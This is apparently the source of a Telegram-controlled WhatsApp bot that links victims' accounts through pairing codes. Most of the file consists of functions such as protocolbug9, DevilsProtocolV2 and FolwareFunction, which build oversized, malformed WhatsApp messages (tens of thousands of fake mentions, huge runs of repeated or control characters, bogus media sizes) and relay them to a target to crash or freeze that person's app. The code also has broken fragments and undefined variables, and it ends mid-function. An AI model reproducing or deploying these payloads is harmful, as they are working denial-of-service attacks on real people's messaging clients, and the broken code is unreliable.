const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateMessageTag,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    generateMessageID,
} = require('@whiskeysockets/baileys');
const fs = require("fs");
const P = require("pino");
const axios = require("axios");
const figlet = require("figlet");
const startTime = Date.now();
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
function isPremium(userId) {
  return premiumUsers.includes(userId.toString());
}
const crypto = require("crypto");
const path = require("path");
const token = config.BOT_TOKEN;
const chalk = require("chalk");
const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";

const defaultSettings = {
  cooldown: 60, // detik
  groupOnly: false
};

if (!fs.existsSync('./settings.json')) {
  fs.writeFileSync('./settings.json', JSON.stringify(defaultSettings, null, 2));
}

let settings = JSON.parse(fs.readFileSync('./settings.json'));

const cooldowns = new Map();

function runtime() {
  const ms = Date.now() - startTime;
  const seconds = Math.floor(ms / 1000) % 60;
  const minutes = Math.floor(ms / (1000 * 60)) % 60;
  const hours = Math.floor(ms / (1000 * 60 * 60)) % 24;
  const days = Math.floor(ms / (1000 * 60 * 60 * 24));
  return `${days}d ${hours}h ${minutes}m ${seconds}s`;
}

function badge(userId) {
  return {
    premium: isPremium(userId) ? "Premium ✅" : "",
    supervip: isSupervip(userId) ? "SuperVip ✅" : "",
    owner: isOwner(userId) ? "Owner ✅" : ""
  };
}




//msg.key.id
const bot = new TelegramBot(token, { polling: true });
function dateTime() {
  const now = new Date();
  const formatter = new Intl.DateTimeFormat("id-ID", {
    timeZone: "Asia/Jakarta",
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
    hour12: false
  });

  const parts = formatter.formatToParts(now);
  const get = (type) => parts.find(p => p.type === type).value;

  return `${get("day")}-${get("month")}-${get("year")} ${get("hour")}:${get("minute")}:${get("second")}`;
}

bot.on('message', (msg) => {
  const chatType = msg.chat.type;
if (settings.groupOnly && msg.chat.type === 'private' && !isOwner(msg.from.id)) {
  return bot.sendMessage(msg.chat.id, '🚫 このボットは *グループチャット* でのみ使用できます。', {
  parse_mode: 'Markdown'
});
}

});


function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        const sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot.sendMessage(
  chatId,
  `
\`\`\`スタートコネクト
（ ！）ステータス：⌛
（ ！）ボット：${botNumber}
\`\`\`
`,
  { parse_mode: "Markdown" }
)
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
  `
\`\`\`再接続中
( ！）ステータス：⌛
( ！）ボット : ${botNumber}
\`\`\`
`,
  {
    chat_id: chatId,
    message_id: statusMessage,
    parse_mode: "Markdown"
  }
);
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
  `
\`\`\`再接続中
( ！）ステータス：❌
( ！）ボット : ${botNumber}
\`\`\`
`,
  {
    chat_id: chatId,
    message_id: statusMessage,
    parse_mode: "Markdown"
  }
);
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
  `
\`\`\`再接続中
( ！）ステータス：✅
( ！）ボット : ${botNumber}
\`\`\`
`,
  {
    chat_id: chatId,
    message_id: statusMessage,
    parse_mode: "Markdown"
  }
);
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
  `
\`\`\`再接続中
( ！）ステータス：${formattedCode}
( ！）ボット : ${botNumber}
\`\`\`
`,
  {
    chat_id: chatId,
    message_id: statusMessage,
    parse_mode: "Markdown"
  }
);
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
          \`\`\`エラー-接続
( ! ) 理由 : ${error.message}
( ! ) ボット : ${botNumber}理由
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}
async function protocolbug9(sock, jid, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "𐌕𐌀𐌌𐌀 ✦ 𐌂𐍉𐌍𐌂𐌖𐌄𐍂𐍂𐍉𐍂"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(jid, messageContent, { userJid: jid });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: jid }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await sock.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await sock.relayMessage(jid, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}
async function protocolbug0(sock, jid, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".Xrelly Modderx" + "ោ៝".repeat(10000),
        title: "Apollo X ",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/xrelly",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "TTJaZa6KqfhanLS4/xvbxkKX/H7Mw0eQs8wxlz7pnQw=",
        fileLength: "1515940",
        seconds: 14,
        mediaKey: "4CpYvd8NsPYx+kypzAXzqdavRMAAL9oNYJOHwVwZK6Y",
        height: 1280,
        width: 720,
        fileEncSha256: "o73T8DrU9ajQOxrDoGGASGqrm63x0HdZ/OKTeqU4G7U=",
        directPath: "/v/t62.7161-24/19384532_1057304676322810_128231561544803484_n.enc?ccb=11-4&oh=01_Q5Aa1gHRy3d90Oldva3YRSUpdfcQsWd1mVWpuCXq4zV-3l2n1A&oe=685BEDA9&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1748276788",
        contextInfo: { isSampled: true, mentionedJid: mentionedList },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "𝚵𝚳𝚸𝚬𝚪𝚯𝐑"
        },
        streamingSidecar: "IbapKv/MycqHJQCszNV5zzBdT9SFN+lW1Bamt2jLSFpN0GQk8s3Xa7CdzZAMsBxCKyQ/wSXBsS0Xxa1RS++KFkProDRIXdpXnAjztVRhgV2nygLJdpJw2yOcioNfGBY+vsKJm7etAHR3Hi6PeLjIeIzMNBOzOzz2+FXumzpj5BdF95T7Xxbd+CsPKhhdec9A7X4aMTnkJhZn/O2hNu7xEVvqtFj0+NZuYllr6tysNYsFnUhJghDhpXLdhU7pkv1NowDZBeQdP43TrlUMAIpZsXB+X5F8FaKcnl2u60v1KGS66Rf3Q/QUOzy4ECuXldFX",
        thumbnailDirectPath: "/v/t62.36147-24/20095859_675461125458059_4388212720945545756_n.enc?ccb=11-4&oh=01_Q5Aa1gFIesc6gbLfu9L7SrnQNVYJeVDFnIXoUOs6cHlynUGZnA&oe=685C052B&_nc_sid=5e03e0",
        thumbnailSha256: "CKh9UwMQmpWH0oFUOc/SrhSZawTp/iYxxXD0Sn9Ri8o=",
        thumbnailEncSha256: "qcxKoO41/bM7bEr/af0bu2Kf/qtftdjAbN32pHgG+eE=",        
        annotations: [{
            embeddedContent: { embeddedMusic },
            embeddedAction: true
        }]
    };

        const stickerMessage = {
        stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
            fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
            mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
            mimetype: "image/webp",
            directPath: "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
            fileLength: { low: 1, high: 0, unsigned: true },
            mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
            firstFrameLength: 19904,
            firstFrameSidecar: "KN4kQ5pyABRAgA==",
            isAnimated: true,
            isAvatar: false,
            isAiSticker: false,
            isLottie: false,
            contextInfo: {
                mentionedJid: mentionedList
            }
        }
    };

    const audioMessage = {
        audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
            fileLength: "389948",
            seconds: 24,
            ptt: false,
            mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
            caption: "𐍇𐍂𐌴𐍧𐍧𐍅 𝚵𝚳𝚸𝚬𝚪𝚯𝐑",
            fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4="
        }
    };

    const msg1 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: { videoMessage } }
    }, {});
    
    const msg2 = generateWAMessageFromContent(jid, {
        viewOnceMessage: { message: stickerMessage }
    }, {});

    const msg3 = generateWAMessageFromContent(jid, audioMessage, {});

    // Relay all messages
    for (const msg of [msg1, msg2, msg3]) {
        await sock.relayMessage("status@broadcast", msg.message, {
            messageId: msg.key.id,
            statusJidList: [jid],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{
                    tag: "mentioned_users",
                    attrs: {},
                    content: [{ tag: "to", attrs: { jid: jid }, content: undefined }]
                }]
            }]
        });
    }

    if (mention) {
        await sock.relayMessage(jid, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg1.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [{
                tag: "meta",
                attrs: { is_status_mention: "true" },
                content: undefined
            }]
        });
    }
}        
async function DevilsProtocolV2(sock, jid, mention) {
    const mentionjid = [
    "9999999999@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
        `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: "Devils Protocols" + "᭄".repeat(10000),
        title: "Version 2" + "᭄",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://n.uguu.se/UnDeath.jpg",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

const devilsMesagge = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "999999999999",
        seconds: 999999,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "𝕯𝖊𝖛𝖎𝖑𝖘 𝕻𝖗𝖔𝖙𝖔𝖈𝖔𝖑𝖘",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
           externalAdReply: {
              showAdAttribution: true,
              title: `🥶`,
              body: `${"\u0000".repeat(9117)}`,
              mediaType: 1,
              renderLargerThumbnail: true,
              thumbnailUrl: null,
              sourceUrl: "https://t.me/FunctionLihX"
        },
           businessMessageForwardInfo: {
              businessOwnerJid: jid,
        },
            isSampled: true,
            mentionedJid: mentionjid
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363406229895095@newsletter",
            serverMessageId: 1,
            newsletterName: `${"ꦾ".repeat(100)}`
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                   embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(jid, {
        viewOnceMessage: {
            message: { devilsMesagge }
        }
    }, {});

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [jid],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: jid }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await sock.relayMessage(jid, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function FolwareFunction(sock, jid, folware) {
  const folwaredellay = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0003".repeat(92000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));
  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\u0003",
          listType: 2,
          buttonText: null,
          sections: folwaredellay,
          singleSelectReply: { selectedRowId: "🗿" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: jid,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "\u0003",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };
  const MassageFolware = {
    extendedTextMessage: {
      text: "\u0003".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\u0003".repeat(500),
      title: "\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\u0003",
          body: "\u0003".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz",
        },
        mentionedJid: Array.from(
          { length: 1000 },
          (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`
        ),
      },
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "\u0003".repeat(1770),
      serviceType: 1,
    },
  };
  
  const msg = generateWAMessageFromContent(jid, MSG, MassageFolware, {});

  await folware.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (folware) {
    await folware.relayMessage(
      jid,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 15,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "⃔ Folware Function 🎵‌",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function FolwareFunction2(sock, jid, folware) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "\u0003",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: jid,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };
    
    const msg1 = generateWAMessageFromContent(jid, generateMessage, {});
    
  const folwaredellay = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(92000) + "ꦽ".repeat(92000) + "\u0003".repeat(92000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }],
  }));
  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\u0003",
          listType: 2,
          buttonText: null,
          sections: folwaredellay,
          singleSelectReply: { selectedRowId: "🗿" },
          contextInfo: {
            mentionedJid: Array.from(
              { length: 9741 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: jid,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "9741@newsletter",
              serverMessageId: 1,
              newsletterName: "-",
            },
          },
          description: "\u0003",
        },
      },
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2,
    },
  };
const MassageFolware = {
    extendedTextMessage: {
      text: "\u0003".repeat(12000),
      matchedText: "https://" + "ꦾ".repeat(500) + ".com",
      canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
      description: "\u0003".repeat(500),
      title: "\u200D".repeat(1000),
      previewType: "NONE",
      jpegThumbnail: Buffer.alloc(10000),
      contextInfo: {
        forwardingScore: 999,
        isForwarded: true,
        externalAdReply: {
          showAdAttribution: true,
          title: "\u0003",
          body: "\u0003".repeat(10000),
          thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
          mediaType: 1,
          renderLargerThumbnail: true,
          sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz",
        },
        mentionedJid: Array.from(
          { length: 1000 },
          (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`
        ),
      },
    },
    paymentInviteMessage: {
      currencyCodeIso4217: "USD",
      amount1000: "999999999",
      expiryTimestamp: "9999999999",
      inviteMessage: "Payment Invite" + "\u0003".repeat(1770),
      serviceType: 1,
    },
  };
  
  const msg2 = generateWAMessageFromContent(jid, MassageFolware, {});

  await folware.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (folware) {
    await folware.relayMessage(
      jid,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 15,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "⃔ Folware Function 🎵‌",
            },
            content: undefined,
          },
        ],
      }
    );
  }
}
async function TagMsgPayment(sock, jid) {
    try {
        const quotedMessage = {
            extendedTextMessage: {
                text: "᭯".repeat(12000),
                matchedText: "https://" + "ꦾ".repeat(500) + ".com",
                canonicalUrl: "https://" + "ꦾ".repeat(500) + ".com",
                description: "\u0000".repeat(500),
                title: "\u200D".repeat(1000),
                previewType: "NONE",
                jpegThumbnail: Buffer.alloc(10000), 
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: false,
                    externalAdReply: {
                        showAdAttribution: true,
                        title: "Lucukausmp?",
                        body: "\u0000".repeat(10000),
                        thumbnailUrl: "https://" + "ꦾ".repeat(500) + ".com",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        sourceUrl: "https://" + "𓂀".repeat(2000) + ".xyz"
                    },
                    mentionedJid: Array.from({ length: 1000 }, (_, i) => `${Math.floor(Math.random() * 1000000000)}@s.whatsapp.net`)
                }
            },
            paymentInviteMessage: {
                currencyCodeIso4217: "USD",
                amount1000: "999999999",
                expiryTimestamp: "9999999999",
                inviteMessage: "Payment Invite" + "💦".repeat(1770),
                serviceType: 1
            }
        };

        let messageObject = await generateWAMessageFromContent(jid, {
            viewOnceMessage: {
                message: {
